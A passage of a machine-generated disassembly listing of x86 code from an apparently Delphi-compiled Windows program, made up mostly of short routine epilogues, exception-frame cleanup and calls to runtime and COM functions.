jmp sub_4038bc
sub_410f3c
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41148d
jmp sub_403608
sub_411594
jmp sub_4038bc
sub_41159b
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4116a5
jmp sub_4038bc
sub_4116ac
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411afc
jmp sub_4038bc
sub_411b03
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411c0d
jmp sub_4038bc
sub_411c14
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41215a
jmp sub_4038bc
sub_412161
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412205
jmp sub_4038bc
sub_41220c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41222e
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4045dc
retn
sub_412227
jmp sub_4038bc
sub_41222e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41228a
jmp sub_4038bc
sub_412291
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41230d
jmp sub_4038bc
sub_412853
jmp sub_4038bc
sub_41285a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4128ed
jmp sub_4038bc
sub_4128f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412911
lea eax [ ebp - 0x14 ]
call sub_4045c4
retn
sub_41290a
jmp sub_4038bc
sub_412911
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41296e
jmp sub_4038bc
sub_412975
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412a17
jmp sub_4038bc
sub_412a34
jmp sub_4038bc
sub_412a3b
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_412f96
jmp sub_4038bc
sub_412f9d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41300e
jmp sub_4038bc
sub_413015
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4133a0
push eax
call sub_40f004
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_4133b4
push eax
call sub_40f004
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_41353f
jmp sub_4038bc
sub_41356b
jmp sub_4038bc
sub_413572
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41379f
jmp sub_4038bc
sub_4137a6
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_413a47
jmp sub_4038bc
sub_413ad5
jmp sub_4038bc
sub_413bc5
jmp sub_4038bc
sub_413c67
jmp sub_4038bc
sub_413d1d
jmp sub_4038bc
sub_413dc4
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40f32c
add esp 0x10
sub_41406e
jmp sub_4038bc
sub_414075
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4140b8
mov ax [ eax ]
retn
sub_4141b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40f004
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_4141d0
mov edx 0x80020004
call sub_4141b8
retn
sub_414220
mov dl 0x1
call sub_414228
retn
sub_414264
jmp [ edx ]
sub_4142d5
jmp sub_4038bc
sub_4142dc
pop esi
pop ebx
pop ebp
retn
sub_4142e0
push ebp
mov ebp esp
call sub_4144a0
pop ebp
retn 0x4
sub_41436c
push ebp
mov ebp esp
call sub_4144a0
pop ebp
retn 0x4
sub_41444f
jmp sub_4038bc
sub_414456
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403118
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4034dc
sub_414478
xor eax eax
retn
sub_41447c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_414490
mov [ ecx ] 0x8
mov al 0x1
retn
sub_414498
call sub_40e778
retn
sub_4144a0
call sub_40e868
retn
sub_4144a8
call sub_40ed18
retn
sub_4144b0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4144c4
call sub_4144a0
retn
sub_4144cc
push ebp
mov ebp esp
call sub_4144a8
pop ebp
retn 0x8
sub_4144e4
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_4145c0
jmp sub_4038bc
sub_414689
jmp sub_4038bc
sub_414690
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4146ad
lea eax [ ebp - 0x10 ]
call sub_403eb8
retn
sub_4146a6
jmp sub_4038bc
sub_4146ad
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4146b8
call sub_40ed6c
retn
sub_4146c0
mov ecx 0xe
call sub_413d5c
cmp al 0x1
retn
sub_41473f
jmp sub_4038bc
sub_414746
pop ebp
retn
sub_4147e9
jmp sub_4038bc
sub_4147f0
pop ebp
retn
sub_414909
jmp sub_4038bc
sub_414910
pop ebp
retn
sub_414914
sub [ rw-data ] 0x1
retn
sub_414a12
jmp sub_4038bc
sub_414a19
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414d38
push ebx
add esp 0xffffff00
mov ebx ecx
push 0xff
lea ecx [ esp + 0x4 ]
call sub_414ca0
mov eax ebx
mov edx esp
call sub_40411c
add esp 0x100
pop ebx
retn
sub_414d94
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_403f0c
pop esi
pop ebx
retn
sub_414e70
jmp sub_4038bc
sub_414e77
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414ec8
jmp sub_4038bc
sub_414ecf
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41501c
jmp sub_4038bc
sub_415023
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4150f2
jmp sub_4038bc
sub_4150f9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415410
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40f32c
pop esi
pop ebx
retn
sub_4156ba
jmp sub_4038bc
sub_4156c1
pop ebp
retn
sub_4156c4
sub [ rw-data ] 0x1
retn
CoInitialize
jmp [ __import_lookup_table_12(ole32:CoInitialize) ]
CoUninitialize
jmp [ CoUninitialize@IAT ]
CoCreateInstance
jmp [ CoCreateInstance@IAT ]
CoTaskMemAlloc
jmp [ __import_lookup_table_12(ole32:CoTaskMemAlloc) ]
sub_415711
jmp sub_4038bc
sub_415718
pop ebp
retn
sub_41571c
sub [ rw-data ] 0x1
retn
sub_41601f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_418f08
sub_416029
add [ esp + 0x4 ] 0xfffffff8
jmp sub_418f28
sub_416901
add [ esp + 0x4 ] 0xffffffec
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x8 ]
sub_416d1f
add [ esp + 0x4 ] 0xffffffd8
jmp sub_42151c
sub_416d29
add [ esp + 0x4 ] 0xffffffd8
jmp sub_42153c
sub_416d33
add [ esp + 0x4 ] 0xffffffd4
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_4170a0
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_4170b0
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_4171d8
mov eax [ eax + 0xc ]
call sub_4185a4
retn
sub_4174af
jmp sub_4038bc
sub_4174b6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4174bc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41875c
test eax eax
setge al
pop esi
pop ebx
retn
sub_4177bf
jmp sub_4038bc
sub_4177c6
mov esp ebp
pop ebp
retn
sub_417894
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_4178a0
push ebx
mov ebx edx
mov edx ebx
call sub_4176b4
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_417414
sub_41794c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_417aa7
jmp sub_4038bc
sub_417b7b
jmp sub_4038bc
sub_417b8c
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_417bf8
jmp sub_4038bc
sub_417bff
pop ebx
mov esp ebp
pop ebp
retn
sub_417c4a
jmp sub_4038bc
sub_417c51
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_417cdd
jmp sub_4038bc
sub_417ce4
pop ebx
pop ebp
retn
sub_417d2a
jmp sub_4038bc
sub_417d31
pop ebx
pop ebp
retn
sub_417d76
jmp sub_4038bc
sub_417d7d
pop ebx
pop ebp
retn
sub_417dc7
jmp sub_4038bc
sub_417dce
pop esi
pop ebx
pop ebp
retn
sub_417e22
jmp sub_4038bc
sub_417e29
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_417f56
jmp sub_4038bc
sub_417fd2
jmp sub_4038bc
sub_4180a8
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_41889c
sub_418198
jmp sub_4038bc
sub_418322
jmp sub_4038bc
sub_418329
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4183c3
jmp sub_4038bc
sub_4183ca
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4183e9
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_4183e2
jmp sub_4038bc
sub_4183e9
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_418455
jmp sub_4038bc
sub_41845c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418554
jmp sub_4038bc
sub_41855b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403128
retn
sub_418571
jmp sub_4038bc
sub_4185d8
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_4188f8
xor edx edx
mov eax ebx
call sub_4188bc
pop ebx
retn
sub_418650
mov eax [ ebp + 0x4 ]
retn
sub_418686
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4186d4
jmp sub_4038bc
sub_4186db
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4186e0
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_4186f8
xor edx edx
call sub_418700
retn
sub_4187e8
mov edx [ eax + 0x8 ]
dec edx
call sub_418700
retn
sub_418968
retn
sub_418a22
jmp sub_4038bc
sub_418a29
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4034dc
sub_418ab8
jmp sub_4038bc
sub_418abf
pop ebx
pop ecx
pop ebp
retn
sub_418ac4
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_418b1b
jmp sub_4038bc
sub_418b22
pop ebx
pop ecx
pop ebp
retn
sub_418b28
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_418b64
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
retn
sub_418b7c
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_418c57
retn
sub_418c58
cmp edx [ eax + 0x4 ]
jae sub_418b64
mov eax [ eax + 0x8 ]
bt [ eax ] edx
sbb eax eax
and eax 0x1
retn
sub_418d14
test edx edx
je r-xdata
xor edx edx
call sub_418d28
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_418dde
jmp sub_4038bc
sub_418de5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418df8
xchg edx eax
call sub_418d28
retn
sub_418e00
retn
sub_418e99
jmp sub_4038bc
sub_418ea0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418ef6
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
sub_41905d
jmp sub_4038bc
sub_419064
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4190f8
xor edx edx
mov [ eax + 0x8 ] edx
add eax 0x4
call sub_40d31c
retn
sub_419108
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x4 ]
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_41927d
jmp sub_4038bc
sub_419284
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4192c8
xor edx edx
call sub_419184
retn
sub_419436
jmp sub_4038bc
sub_419450
inc [ eax + 0xc ]
retn
sub_419454
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_4194be
jmp sub_4038bc
sub_4194cc
dec [ eax + 0xc ]
call sub_419454
retn
sub_419508
xor eax eax
retn
sub_41950c
push ebx
mov ebx ecx
mov eax ebx
call sub_403eb8
pop ebx
retn
sub_419602
jmp sub_4038bc
sub_419609
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419719
jmp sub_4038bc
sub_419810
retn
sub_419814
retn
sub_419854
retn
sub_419858
retn
sub_4198c4
mov eax [ eax + 0x18 ]
retn
sub_4199ca
jmp sub_4038bc
sub_4199d1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4199ee
lea eax [ ebp - 0xc ]
call sub_403eb8
retn
sub_4199e7
jmp sub_4038bc
sub_4199ee
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419a78
jmp sub_4038bc
sub_419a90
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_419b4c
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_419bf5
jmp sub_4038bc
sub_419bfc
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419c08
mov eax [ ebp + 0x4 ]
retn
sub_419c3e
pop ecx
pop edx
pop esi
pop ebx
retn
sub_419c8c
jmp sub_4038bc
sub_419c93
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419d52
jmp sub_4038bc
sub_419d59
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419d7b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403edc
retn
sub_419d74
jmp sub_4038bc
sub_419d7b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419df3
jmp sub_4038bc
sub_419dfa
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419e00
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_419e59
jmp sub_4038bc
sub_419e60
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_419e68
xor eax eax
retn
sub_419eb1
jmp sub_4038bc
sub_419eb8
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_419fcb
jmp sub_4038bc
sub_419fd2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a067
jmp sub_4038bc
sub_41a06e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a0ec
jmp sub_4038bc
sub_41a0f3
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a1c3
jmp sub_4038bc
sub_41a1ca
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a280
jmp sub_4038bc
sub_41a287
pop esi
pop ecx
pop ebp
retn
sub_41a30c
jmp sub_4038bc
sub_41a313
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a330
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
sub_41a329
jmp sub_4038bc
sub_41a330
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a3bc
jmp sub_4038bc
sub_41a3d9
jmp sub_4038bc
sub_41a3e0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a41c
retn
sub_41a49f
jmp sub_4038bc
sub_41a4a6
mov eax [ ebp - 0x8 ]
call sub_41d044
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a4cb
lea eax [ ebp - 0xc ]
call sub_403eb8
retn
sub_41a4c4
jmp sub_4038bc
sub_41a4cb
mov esp ebp
pop ebp
retn
sub_41a51b
jmp sub_4038bc
sub_41a522
pop esi
pop ecx
pop ebp
retn
sub_41a575
jmp sub_4038bc
sub_41a57c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a584
retn
sub_41a5ff
jmp sub_4038bc
sub_41a606
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a6a3
jmp sub_4038bc
sub_41a6aa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a6c7
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
sub_41a6c0
jmp sub_4038bc
sub_41a6c7
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a6cc
retn
sub_41a746
jmp sub_4038bc
sub_41a74d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a754
mov eax edx
mov edx ecx
call sub_407f38
retn
sub_41a760
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_41a778
sub_41a7f0
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_41a860
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_41a87c
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41aa70
mov eax [ eax + 0x18 ]
retn
sub_41aa74
mov eax [ eax + 0x14 ]
retn
sub_41ab10
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_41ad1c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_40270c
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_41ad58
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_41ad70
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_41ad84
mov edx sub_41ad70
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_41adcc
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_407f38
retn
mov eax edx
mov edx ecx
call sub_407f00
retn
sub_41ae68
retn
sub_41b160
jmp sub_4038bc
sub_41b167
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41b1c8
jmp sub_4038bc
sub_41b1cf
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b1d8
xor ecx ecx
call sub_41b1e0
retn
sub_41b230
jmp sub_4038bc
sub_41b237
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41b278
mov eax [ eax + 0x4 ]
call sub_408594
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41b288
mov eax [ eax + 0x4 ]
call sub_4085c0
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41b2c4
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_41b46d
jmp sub_4038bc
sub_41b4cc
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_41b55c
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41b5ac
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_41b797
jmp sub_4038bc
sub_41b79e
mov esp ebp
pop ebp
retn
sub_41b848
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
retn
sub_41b8d0
mov [ eax + 0x18 ] edx
retn
sub_41ba4c
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_414c44
retn
sub_41bad3
jmp sub_4038bc
sub_41bada
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41bb86
jmp sub_4038bc
sub_41bb8d
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41bd31
jmp sub_4038bc
sub_41bd83
jmp sub_4038bc
sub_41bda2
jmp sub_4038bc
sub_41bda9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bdc8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41bdc1
jmp sub_4038bc
sub_41bdc8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41be6b
jmp sub_4038bc
sub_41bef3
jmp sub_4038bc
sub_41bf00
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
pop ebx
retn
sub_41bf18
mov eax [ rw-data ]
call sub_41bf00
retn
sub_41bf50
push ebx
call sub_414a78
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_41bf18
sub_41c0bd
jmp sub_4038bc
sub_41c0c4
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_403eb8
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_41c1e4
jmp sub_4038bc
sub_41c1eb
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41c2e2
jmp sub_4038bc
sub_41c2ff
jmp sub_4038bc
sub_41c306
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c404
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41ade8
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_41c4c8
push ebx
mov ebx eax
mov eax ebx
call sub_41de7c
cmp al 0x9
sete al
pop ebx
retn
sub_41c527
jmp sub_4038bc
sub_41c52e
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41c5d4
jmp sub_4038bc
sub_41c5db
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c5f4
[ esi + ebp * 2 + 0x43070041 ]
sub_41c85a
jmp sub_403608
sub_41c886
jmp sub_403608
sub_41c928
jmp sub_403608
sub_41c9cb
jmp sub_403608
sub_41cba3
jmp sub_403608
sub_41cbe5
jmp sub_4038bc
sub_41cc15
jmp sub_4038bc
sub_41cc1c
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41cc8b
jmp sub_4038bc
sub_41cd62
jmp sub_4038bc
sub_41cd69
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d03c
mov dl 0x1
call sub_41bfa4
retn
sub_41d17d
jmp sub_4038bc
sub_41d184
pop ebx
mov esp ebp
pop ebp
retn
sub_41d18c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41df8c
mov eax [ rw-data ]
call sub_41bf00
pop ebp
retn
j_sub_403734#2
jmp sub_403734
j_sub_403734
jmp sub_403734
sub_41d378
jmp sub_4038bc
sub_41d37f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d45f
jmp sub_4038bc
sub_41d466
mov esp ebp
pop ebp
retn
sub_41d51e
jmp sub_4038bc
sub_41d525
pop ecx
pop ecx
pop ebp
retn
sub_41d827
jmp sub_4038bc
sub_41d82e
pop ebx
mov esp ebp
pop ebp
retn
sub_41dad3
jmp sub_4038bc
sub_41dada
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_403128
retn
sub_41daf3
jmp sub_4038bc
sub_41db17
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_403608
sub_41db4e
jmp sub_403608
sub_41db8d
jmp sub_4038bc
sub_41db94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dbb6
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_403edc
retn
sub_41dbaf
jmp sub_4038bc
sub_41dbb6
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41dc3d
jmp sub_403608
sub_41dc6a
jmp sub_4038bc
sub_41dc71
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41dc7c
push ecx
mov edx esp
mov ecx 0x4
call sub_41c440
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_41bf00
sub_41dd89
jmp sub_4038bc
sub_41dd90
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41de6f
jmp sub_4038bc
sub_41de76
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41decc
jmp sub_4038bc
sub_41ded3
pop ebx
pop ecx
pop ebp
retn
sub_41e11b
jmp sub_4038bc
sub_41e122
pop ecx
pop ecx
pop ebp
retn
sub_41e165
jmp sub_4038bc
sub_41e16c
pop ebx
pop ecx
pop ebp
retn
sub_41e208
jmp sub_4038bc
sub_41e20f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e2bd
jmp sub_4038bc
sub_41e2c4
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e2d0
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_41e52b
jmp sub_4038bc
sub_41e532
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e557
mov eax [ ebp - 0x8 ]
call sub_403128
mov eax [ ebp - 0x4 ]
call sub_403128
retn
sub_41e550
jmp sub_4038bc
sub_41e557
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e57c
lea eax [ ebp - 0x1c ]
call sub_4057b4
lea eax [ ebp - 0x18 ]
call sub_403eb8
retn
sub_41e575
jmp sub_4038bc
sub_41e57c
pop ebx
mov esp ebp
pop ebp
retn
sub_41e78e
jmp sub_4038bc
sub_41e795
pop ebx
mov esp ebp
pop ebp
retn
sub_41e7c8
mov eax [ eax + 0x30 ]
call sub_4185a4
retn
sub_41e838
call sub_41e968
retn
sub_41e87c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41b8d0
mov [ ebx + 0x1c ] esi
pop esi
pop ebx
retn
sub_41e957
jmp sub_4038bc
sub_41e95e
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41e968
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_41b04c
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_41e980
test dl dl
je r-xdata
mov dl 0x8
call sub_420aec
retn
mov dl 0x9
call sub_420aec
retn
sub_41e9d7
jmp sub_4038bc
sub_41e9de
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41ea76
jmp sub_4038bc
sub_41ea7d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ec1b
jmp sub_4038bc
sub_41ec22
pop esi
pop ebx
